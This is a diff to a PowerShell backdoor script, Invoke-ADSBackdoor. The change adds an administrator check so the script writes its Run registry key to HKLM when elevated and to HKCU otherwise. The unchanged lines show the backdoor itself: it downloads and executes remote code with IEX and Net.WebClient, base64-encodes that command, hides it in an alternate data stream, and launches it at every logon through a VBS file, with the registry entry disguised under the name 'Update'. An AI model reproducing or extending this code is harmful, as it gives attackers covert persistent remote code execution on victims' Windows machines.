@@ -1,3 +1,10 @@
+function Test-IsAdmin {
+
+([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+
+}
+
+
 function Invoke-ADSBackdoor{
 <#
 .SYNOPSIS
@@ -61,7 +68,13 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
     $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
     $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
-
+    #Check if powershell session is run as Admin
+    if (!(Test-IsAdmin)){
+        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    }
+    else {
+        $RegPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+    }
     #Store Payload
     $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
@@ -88,8 +101,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     
 
     #Persist in Registry
-    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
-    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
+    new-itemproperty -Path $RegPath -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
+    "Process Complete. Persistent key is located at $RegPath\Update"
 }
 
 
